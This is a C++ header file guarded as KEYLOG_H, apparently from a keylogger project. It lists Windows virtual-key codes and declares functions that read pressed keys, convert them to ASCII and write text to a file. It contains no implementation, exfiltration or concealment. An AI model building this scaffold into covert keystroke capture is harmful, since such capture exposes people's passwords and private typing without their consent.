#ifndef KEYLOG_H
#define KEYLOG_H

#include <vector>
#include <string>

// Definitely Windows specific
enum vcodes {VC_BACK = 0x08, VC_TAB, VC_CLEAR = 0x0C, VC_RETURN, VC_SHIFT = 0x10, VC_CONTROL,
    VC_MENU, VC_PAUSE, VC_CAPITAL, VC_ESCAPE = 0x1B, VC_SPACE = 0x20, VC_PRIOR, VC_NEXT, VC_END,
    VC_HOME, VC_LEFT, VC_UP, VC_RIGHT, VC_DOWN, VC_SELECT, VC_PRINT, VC_EXECUTE, VC_SNAPSHOT,
    VC_INSERT, VC_DELETE, VC_HELP, VC_0, VC_1, VC_2, VC_3, VC_4, VC_5, VC_6, VC_7, VC_8, VC_9,
    VC_A = 0x41, VC_B, VC_C, VC_D, VC_E, VC_F, VC_G, VC_H, VC_I, VC_J, VC_K, VC_L, VC_M, VC_N,
    VC_O, VC_P, VC_Q, VC_R, VC_S, VC_T, VC_U, VC_V, VC_W, VC_X, VC_Y, VC_Z, VC_LWIN, VC_RWIN,
    VC_APPS, VC_SLEEP = 0x5F, VC_NUMPAD0, VC_NUMPAD1, VC_NUMPAD2, VC_NUMPAD3, VC_NUMPAD4,
    VC_NUMPAD5, VC_NUMPAD6, VC_NUMPAD7, VC_NUMPAD8, VC_NUMPAD9, VC_MULTIPLY, VC_ADD,
    VC_SEPARATOR, VC_SUBTRACT, VC_DECIMAL, VC_DIVIDE, VC_OEM_1 = 0xBA /*';:'*/,
    VC_OEM_PLUS /*'+'*/, VC_OEM_COMMA /*','*/, VC_OEM_MINUS /*'-'*/, VC_OEM_PERIOD /*'.'*/,
    VC_OEM_2 /*'/?'*/, VC_OEM_3 /*'`~'*/, VC_OEM_4 = 0xDB /*'[{'*/, VC_OEM_5 /*'\|'*/,
    VC_OEM_6 /*']}'*/, VC_OEM_7 /*''"'*/, VC_OEM_8 /*'IDK'*/, VC_OEM_CLEAR = 0xFE, END};



// Maybe Windows specific


std::vector<vcodes> getPressedKeyboardState();
std::string getAscii(std::vector<vcodes>);

// Generic

void writeToFile(std::string, std::string);

#endif